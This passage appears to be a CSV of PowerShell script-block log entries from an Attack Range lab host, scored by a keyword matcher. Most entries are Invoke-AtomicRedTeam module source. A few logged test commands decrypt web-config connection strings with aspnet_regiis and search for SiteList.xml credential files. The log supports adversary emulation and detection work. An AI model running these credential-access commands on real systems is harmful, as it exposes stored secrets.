                $InputArgumentNamesFromExecutor | ForEach-Object {
                    if ($InputArgumentNames -notcontains $_) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'""
                        return
                    }
                }
            }

            # Validate that all defined input args are utilized at least once in the executor.
            if ($InputArgumentNames.Count) {
                $InputArgumentNames | ForEach-Object {
                    if ($InputArgumentNamesFromExecutor -notcontains $_) {
                        # Write a warning since this scenario is not considered a breaking change
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.""
                    }
                }
            }

            $ExecutorInstance.name = $AtomicTest['executor']['name']

            $AtomicTestInstance.executor = $ExecutorInstance

            $AtomicTests[$i] = $AtomicTestInstance
        }

        $AtomicInstance.atomic_tests = $AtomicTests

        $AtomicInstance
    }
}


# Tab completion for Atomic Tests
function Get-TechniqueNumbers {
    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }
    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |
    ForEach-Object { $_.BaseName }

    return $techniqueNumbers
}

Register-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)

    Get-TechniqueNumbers | Where-Object { $_ -like ""$wordToComplete*"" } |
    ForEach-Object {
        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', ""Technique number $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:45 PM","35709062","1",", Get","Get [Score: 1]","37","{ Get-WebConfig | Where-Object {$_} }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:45 PM","35709074","1",", Get","Get [Score: 1]","118","C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regiis.exe -pdf ""connectionStrings"" (get-item $Env:temp).FullName","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1","Pattern 'Get' matched: 'get-'"
"12/16/2024 8:34:46 PM","35709149","1",", Get","Get [Score: 1]","89","{ Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711112","1",", Get","Get [Score: 1]","1945","function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {
    $defaultArgs = @{ }
    foreach ($key in $ip.Keys) {
        $defaultArgs[$key] = $ip[$key].default
    }
    # overwrite defaults with any user supplied values
    foreach ($key in $customInputArgs.Keys) {
        if ($defaultArgs.Keys -contains $key) {
            # replace default with user supplied
            $defaultArgs.set_Item($key, $customInputArgs[$key])
        }
        else {
            Write-Verbose ""The specified input argument *$key* was ignored as not applicable""
        }
    }
    $defaultArgs
}

function Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {
    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {
        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'
        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder

        foreach ($key in $inputArgs.Keys) {
            $findValue = '#{' + $key + '}'
            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])
        }
    }

    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value
    $finalCommand = ($finalCommand -replace ""\`$PathToAtomicsFolder"", $PathToAtomicsFolder) -replace ""PathToAtomicsFolder"", $PathToAtomicsFolder

    $finalCommand
}

function Invoke-PromptForInputArgs([hashtable]$ip) {
    $InputArgs = @{ }
    foreach ($key in $ip.Keys) {
        $InputArgs[$key] = $ip[$key].default
        $newValue = Read-Host -Prompt ""Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]""
        # replace default with user supplied
        if (-not [string]::IsNullOrWhiteSpace($newValue)) {
            $InputArgs.set_Item($key, $newValue)
        }
    }
    $InputArgs
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711103","1",", Get","Get [Score: 1]","1000","function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {
    $FailureReasons = New-Object System.Collections.ArrayList
    if ( $test.executor.elevation_required -and -not $isElevated) {
        $FailureReasons.add(""Elevation required but not provided`n"") | Out-Null
    }
    foreach ($dep in $test.dependencies) {
        $executor = Get-PrereqExecutor $test
        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
        if ($executor -ne ""powershell"") { $final_command = ($final_Command.trim()).Replace(""`n"", "" && "") }
        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session
        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
        if ($res.ExitCode -ne 0) {
            $FailureReasons.add($description) | Out-Null
        }
    }
    $FailureReasons
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711097","1",", Get","Get [Score: 1]","195","function Get-PrereqExecutor ($test) {
    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }
    else { $executor = $test.dependency_executor_name }
    $executor
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711080","1",", Get","Get [Score: 1]","426","function Invoke-KillProcessTree {
    Param([int]$ppid)
    if ($IsLinux -or $IsMacOS) {
        sh -c ""pkill -9 -P $ppid""
    }
    else {
        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {
            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }
        }
        Stop-Process -Id $ppid -ErrorAction Ignore
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711071","1",", Get","Get [Score: 1]","5227","athToPayloads
                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true

                            if ($res.ExitCode -eq 0) {
                                Write-KeyValue ""Prereq already met: "" $description
                            }
                            else {
                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true
                                if ($res.ExitCode -eq 0) {
                                    Write-KeyValue ""Prereq successfully met: "" $description
                                }
                                else {
                                    Write-Host -ForegroundColor Red ""Failed to meet prereq: $description""
                                }
                            }
                        }
                    }
                    elseif ($Cleanup) {
                        Write-KeyValue ""Executing cleanup for test: "" $testId
                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-KeyValue ""Done executing cleanup for test: "" $testId
                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Remove-TerraformFiles $AT $testCount
                        }
                    }
                    else {
                        Write-KeyValue ""Executing test: "" $testId
                        $startTime = Get-Date
                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads
                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }
                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive
                        Write-Host ""Exit code: $($res.ExitCode)""
                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }
                        $stopTime = Get-Date
                        if ($isLoggingModuleSet) {
                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                                &""$_\Write-ExecutionLog"" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))
                            }
                        }
                        Write-KeyValue ""Done executing test: "" $testId
                    }

                } # End of foreach Test in single Atomic Technique
            } # End of foreach Technique in Atomic Tests
            if ($numAtomicsApplicableToPlatform -eq 0) {
                Write-Host -ForegroundColor Yellow ""Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString""
            }
        } # End of Invoke-AtomicTestSingle function

        if ($AtomicTechnique -eq ""All"") {
            function Invoke-AllTests() {
                $AllAtomicTests = New-Object System.Collections.ArrayList
                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {
                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)
                    if ( $currentTechnique -match ""T[0-9]{4}.?([0-9]{3})?"" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }
                }
                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }
            }

            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',
                    ""Highway to the danger zone, Executing All Atomic Tests!"" ) ) {
                Invoke-AllTests
            }
        }
        else {
            Invoke-AtomicTestSingle $AtomicTechnique
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Stop-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))
            }
        }

    } # End of PROCESS block
    END { } # Intentionally left blank and can be removed
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:57 PM","35711070","1",", Get","Get [Score: 1]","19031","function Invoke-AtomicTest {
    [CmdletBinding(DefaultParameterSetName = 'technique',
        SupportsShouldProcess = $true,
        PositionalBinding = $false,
        ConfirmImpact = 'Medium')]
    Param(
        [Parameter(Mandatory = $true,
            Position = 0,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $AtomicTechnique,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetails,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $ShowDetailsBrief,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $anyOS,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNumbers,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestNames,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String[]]
        $TestGuids,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }),

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $CheckPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $PromptForInputArgs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $GetPrereqs = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Cleanup = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $NoExecutionLog = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { ""/tmp/Invoke-AtomicTest-ExecutionLog.csv"" } else { ""$env:TEMP\Invoke-AtomicTest-ExecutionLog.csv"" }),

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $Force,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [HashTable]
        $InputArgs,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [Int]
        $TimeoutSeconds = 120,

        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]
        [System.Management.Automation.Runspaces.PSSession[]]$Session,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $Interactive = $false,

        [Parameter(Mandatory = $false,
            ValueFromPipelineByPropertyName = $true,
            ParameterSetName = 'technique')]
        [switch]
        $KeepStdOutStdErrFiles = $false,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [String]
        $LoggingModule,

        [Parameter(Mandatory = $false,
            ParameterSetName = 'technique')]
        [switch]
        $SupressPathToAtomicsFolder = $false

    )
    BEGIN { } # Intentionally left blank and can be removed
    PROCESS {
        function ConvertTo-LoggerArray {
            param (
                [Parameter(Mandatory = $true)]
                [string]$Loggers
            )

            return $Loggers -split ',' | ForEach-Object { $_.Trim() }
        }

        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path

        Write-Verbose -Message 'Attempting to run Atomic Techniques'
        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan ""PathToAtomicsFolder = $PathToAtomicsFolder`n"" }

        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session
        $PathToPayloads = if ($Session) { ""$tmpDir`AtomicRedTeam"" }  else { $PathToAtomicsFolder }

        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.
        # So converting it back to string.
        if ($AtomicTechnique -is [array]) {
            $AtomicTechnique = $AtomicTechnique -join "",""
        }

        # Splitting Atomic Technique short form into technique and test numbers.
        $AtomicTechniqueParams = ($AtomicTechnique -split '-')
        $AtomicTechnique = $AtomicTechniqueParams[0]

        if ($AtomicTechniqueParams.Length -gt 1) {
            $ShortTestNumbers = $AtomicTechniqueParams[-1]
        }

        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {
            $TestNumbers = $ShortTestNumbers -split ','
        }

        $isLoggingModuleSet = $false
        if (-not $NoExecutionLog) {
            $isLoggingModuleSet = $true
            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {
                # no logging module explicitly set
                # syslog logger
                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort
                if ( $artConfig.LoggingModule -eq ""Syslog-ExecutionLogger"" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {
                    if ($syslogOptionsSet) {
                        $LoggingModule = ""Syslog-ExecutionLogger""
                    }
                    else {
                        Write-Host -Fore Yellow ""Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead""
                        $LoggingModule = ""Default-ExecutionLogger""
                    }
                }
                elseif (-not [bool]$artConfig.LoggingModule) {
                    # loggingModule is blank (not set), so use the default logger
                    $LoggingModule = ""Default-ExecutionLogger""
                }
                else {
                    $LoggingModule = $artConfig.LoggingModule
                }
            }
        }

        if ($isLoggingModuleSet) {
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                if (Get-Module -name $_) {
                    Write-Verbose ""Using Logger: $_""
                }
                else {
                    Write-Host -Fore Yellow ""Logger not found: "", $_
                }

                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger
                if ($_ -eq ""Attire-ExecutionLogger"") { $ExecutionLogPath = $ExecutionLogPath.Replace(""Invoke-AtomicTest-ExecutionLog.csv"", ""Invoke-AtomicTest-ExecutionLog-timestamp.json"") }
                $ExecutionLogPath = $ExecutionLogPath.Replace(""timestamp"", $(Get-Date -UFormat %s))

                if (Get-Command ""$_\Start-ExecutionLog"" -erroraction silentlycontinue) {
                    if (Get-Command ""$_\Write-ExecutionLog"" -erroraction silentlycontinue) {
                        if (Get-Command ""$_\Stop-ExecutionLog"" -erroraction silentlycontinue) {
                            Write-Verbose ""All logging commands found""
                        }
                        else {
                            Write-Host ""Stop-ExecutionLog not found or loaded from the wrong module""
                            return
                        }
                    }
                    else {
                        Write-Host ""Write-ExecutionLog not found or loaded from the wrong module""
                        return
                    }
                }
                else {
                    Write-Host ""Start-ExecutionLog not found or loaded from the wrong module""
                    return
                }
            }

            # Here we're rebuilding an equivalent command line to put in the logs
            $commandLine = ""Invoke-AtomicTest $AtomicTechnique""

            if ($ShowDetails -ne $false) {
                $commandLine = ""$commandLine -ShowDetails $ShowDetails""
            }

            if ($ShowDetailsBrief -ne $false) {
                $commandLine = ""$commandLine -ShowDetailsBrief $ShowDetailsBrief""
            }

            if ($null -ne $TestNumbers) {
                $commandLine = ""$commandLine -TestNumbers $TestNumbers""
            }

            if ($null -ne $TestNames) {
                $commandLine = ""$commandLine -TestNames $TestNames""
            }

            if ($null -ne $TestGuids) {
                $commandLine = ""$commandLine -TestGuids $TestGuids""
            }

            $commandLine = ""$commandLine -PathToAtomicsFolder $PathToAtomicsFolder""

            if ($CheckPrereqs -ne $false) {
                $commandLine = ""$commandLine -CheckPrereqs $CheckPrereqs""
            }

            if ($PromptForInputArgs -ne $false) {
                $commandLine = ""$commandLine -PromptForInputArgs $PromptForInputArgs""
            }

            if ($GetPrereqs -ne $false) {
                $commandLine = ""$commandLine -GetPrereqs $GetPrereqs""
            }

            if ($Cleanup -ne $false) {
                $commandLine = ""$commandLine -Cleanup $Cleanup""
            }

            if ($NoExecutionLog -ne $false) {
                $commandLine = ""$commandLine -NoExecutionLog $NoExecutionLog""
            }

            $commandLine = ""$commandLine -ExecutionLogPath $ExecutionLogPath""

            if ($Force -ne $false) {
                $commandLine = ""$commandLine -Force $Force""
            }

            if ($InputArgs -ne $null) {
                $commandLine = ""$commandLine -InputArgs $InputArgs""
            }

            $commandLine = ""$commandLine -TimeoutSeconds $TimeoutSeconds""
            if ($PSBoundParameters.ContainsKey('Session')) {
                if ( $null -eq $Session ) {
                    Write-Error ""The provided session is null and cannot be used.""
                    continue
                }
                else {
                    $commandLine = ""$commandLine -Session $Session""
                }
            }

            if ($Interactive -ne $false) {
                $commandLine = ""$commandLine -Interactive $Interactive""
            }

            if ($KeepStdOutStdErrFiles -ne $false) {
                $commandLine = ""$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles""
            }

            if ($null -ne $LoggingModule) {
                $commandLine = ""$commandLine -LoggingModule $LoggingModule""
            }

            $startTime = Get-Date
            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {
                &""$_\Start-ExecutionLog"" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))
            }
        }

        function Platform-IncludesCloud {
            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $true
                }
            }
            return $false
        }

        function Test-IncludesTerraform($AT, $testCount) {
            $AT = $AT.ToUpper()
            $pathToTerraform = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount\$AT-$testCount.tf""
            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')
            foreach ($platform in $test.supported_platforms) {
                if ($cloud -contains $platform) {
                    return $(Test-Path -Path $pathToTerraform)
                }
            }
            return $false
        }

        function Build-TFVars($AT, $testCount, $InputArgs) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            if ($InputArgs) {
                $destinationVarsPath = Join-Path ""$tmpDirPath"" ""terraform.tfvars.json""
                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath
            }
        }

        function Remove-TerraformFiles($AT, $testCount) {
            $tmpDirPath = Join-Path $PathToAtomicsFolder ""\$AT\src\$AT-$testCount""
            Write-Host $tmpDirPath
            $tfStateFile = Join-Path $tmpDirPath ""terraform.tfstate""
            $tfvarsFile = Join-Path $tmpDirPath ""terraform.tfvars.json""
            if ($(Test-Path $tfvarsFile)) {
                Remove-Item -LiteralPath $tfvarsFile -Force
            }
            if ($(Test-Path $tfStateFile)) {
                (Get-ChildItem -Path $tmpDirPath).Fullname -match ""terraform.tfstate*"" | Remove-Item -Force
            }
        }

        function Invoke-AtomicTestSingle ($AT) {

            $AT = $AT.ToUpper()
            $pathToYaml = Join-Path $PathToAtomicsFolder ""\$AT\$AT.yaml""
            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }
            else {
                Write-Host -Fore Red ""ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter""
                return
            }
            $techniqueCount = 0
            $numAtomicsApplicableToPlatform = 0
            $techniqueString = """"
            foreach ($technique in $AtomicTechniqueHash) {
                $techniqueString = $technique.attack_technique[0]
                $techniqueCount++

                $props = @{
                    Activity        = ""Running $($technique.display_name.ToString()) Technique""
                    Status          = 'Progress:'
                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)
                }
                Write-Progress @props

                Write-Debug -Message ""Gathering tests for Technique $technique""

                $testCount = 0
                foreach ($test in $technique.atomic_tests) {

                    Write-Verbose -Message 'Determining tests for target platform'

                    $testCount++

                    if (-not $anyOS) {
                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {
                            Write-Verbose -Message ""Unable to run non-$executionPlatform tests""
                            continue
                        }

                        if ( $executionPlatform -eq ""windows"" -and ($test.executor.name -eq ""sh"" -or $test.executor.name -eq ""bash"")) {
                            Write-Verbose -Message ""Unable to run sh or bash on $executionPlatform""
                            continue
                        }
                        if ( (""linux"", ""macos"") -contains $executionPlatform -and $test.executor.name -eq ""command_prompt"") {
                            Write-Verbose -Message ""Unable to run cmd.exe on $executionPlatform""
                            continue
                        }
                    }


                    if ($null -ne $TestNumbers) {
                        if (-Not ($TestNumbers -contains $testCount) ) { continue }
                    }

                    if ($null -ne $TestNames) {
                        if (-Not ($TestNames -contains $test.name) ) { continue }
                    }

                    if ($null -ne $TestGuids) {
                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }
                    }

                    $props = @{
                        Activity        = 'Running Atomic Tests'
                        Status          = 'Progress:'
                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)
                    }
                    Write-Progress @props

                    Write-Verbose -Message 'Determining manual tests'

                    if ($test.executor.name.Contains('manual')) {
                        Write-Verbose -Message 'Unable to run manual tests'
                        continue
                    }
                    $numAtomicsApplicableToPlatform++

                    $testId = ""$AT-$testCount $($test.name)""
                    if ($ShowDetailsBrief) {
                        Write-KeyValue $testId
                        continue
                    }

                    if ($PromptForInputArgs) {
                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments
                    }

                    if ($ShowDetails) {
                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads
                        continue
                    }

                    Write-Debug -Message 'Gathering final Atomic test command'


                    if ($CheckPrereqs) {
                        Write-KeyValue ""CheckPrereq's for: "" $testId
                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session
                        Write-PrereqResults $FailureReasons $testId
                    }
                    elseif ($GetPrereqs) {
                        if ($(Test-IncludesTerraform $AT $testCount)) {
                            Build-TFVars $AT $testCount $InputArgs
                        }
                        Write-KeyValue ""GetPrereq's for: "" $testId
                        if ( $test.executor.elevation_required -and -not $isElevated) {
                            Write-Host -ForegroundColor Red ""Elevation required but not provided""
                        }
                        if ($nul -eq $test.dependencies) { Write-KeyValue ""No Preqs Defined""; continue }
                        foreach ($dep in $test.dependencies) {
                            $executor = Get-PrereqExecutor $test
                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()
                            Write-KeyValue  ""Attempting to satisfy prereq: "" $description
                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads
                            if ($executor -ne ""powershell"") { $final_command_prereq = ($final_command_prereq.trim()).Replace(""`n"", "" && "") }
                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $P","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:54 PM","35710521","1",", Get","Get [Score: 1]","1359","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    if (!(Test-Path $logPath)) {
        New-Item $logPath -Force -ItemType File | Out-Null
    }
    $ipAddress = Get-PreferredIPAddress $isWindows
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710524","1",", Get","Get [Score: 1]","6031","# Attire-ExecutionLogger.psm1
# Copyright 2023 Security Risk Advisors

# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the Software),
# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED AS IS, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

$script:attireLog = [PSCustomObject]@{
    'attire-version' = '1.1'
    'execution-data' = ''
    'procedures'     = @()
}

function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

    $ipAddress = Get-PreferredIPAddress $isWindows

    if ($targetUser -isnot [string]) {
        if ([bool]($targetUser.PSobject.Properties.name -match ""^value$"")) {
            $targetUser = $targetUser.value
        }
        else {
            $targetUser = $targetUser.ToString()
        }
    }
    if ($targetHostname -isnot [string]) {
        if ([bool]($targetHostname.PSobject.Properties.name -match ""^value$"")) {
            $targetHostname = $targetHostname.value
        }
        else {
            $targetHostname = $targetHostname.ToString()
        }
    }

    $target = [PSCustomObject]@{
        user = $targetUser
        host = $targetHostname
        ip   = $ipAddress
        path = $Env:PATH
    }

    $guid = New-Guid
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)
    $executionId = [Convert]::ToBase64String($bytes)

    $executionCategory = [PSCustomObject]@{
        'name'         = ""Atomic Red Team""
        'abbreviation' = ""ART""
    }

    $executionData = [PSCustomObject]@{
        'execution-source'   = ""Invoke-Atomicredteam""
        'execution-id'       = $executionId
        'execution-category' = $executionCategory
        'execution-command'  = $commandLine
        target               = $target
        'time-generated'     = """"
    }

    $script:attireLog.'execution-data' = $executionData
}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {

    $startTime = (Get-Date($startTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()
    $stopTime = (Get-Date($stopTime).ToUniversalTime() -UFormat '+%Y-%m-%dT%H:%M:%S.000Z').ToString()

    $procedureId = [PSCustomObject]@{
        type = ""guid""
        id   = $testGuid
    }

    $step = [PSCustomObject]@{
        'order'      = 1
        'time-start' = $startTime
        'time-stop'  = $stopTime
        'executor'   = $testExecutor
        'command'    = $command
        'process-id' = $res.ProcessId
